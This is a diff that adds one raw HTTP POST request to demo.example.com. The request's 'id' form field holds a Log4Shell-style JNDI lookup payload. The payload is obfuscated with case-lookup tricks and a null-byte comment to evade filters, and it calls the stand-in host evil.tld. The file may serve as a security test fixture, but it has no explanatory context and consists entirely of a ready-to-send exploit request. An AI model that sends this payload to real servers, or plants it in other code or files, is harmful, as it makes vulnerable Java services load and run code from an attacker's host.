@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Connection: close
+
+id=${/*%00*/jndi:${lower:l}${lower:d}a${lower:p}://evil.tld/x}
